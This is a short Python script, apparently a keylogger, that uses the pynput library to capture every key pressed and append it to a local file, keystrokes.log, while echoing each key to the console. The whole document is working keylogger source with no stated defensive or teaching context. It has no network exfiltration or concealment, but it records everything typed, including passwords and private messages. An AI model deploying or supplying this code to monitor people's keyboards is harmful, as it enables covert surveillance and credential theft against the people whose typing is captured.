from pynput import keyboard

log_file = 'keystrokes.log'

# Function to log keystrokes
def on_press(key):
    try:
        # Capture the key name or character
        if hasattr(key, 'char') and key.char is not None:
            logged_key = key.char
        else:
            logged_key = f'[{key.name}]'

        # Log the keystroke to the file
        with open(log_file, 'a') as f:
            f.write(logged_key)

        # Print to console for testing
        print(f"Logged: {logged_key}")

    except Exception as e:
        print(f"Error: {e}")

# Start listening for keyboard input
def start_keylogger():
    print("Keylogger started. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
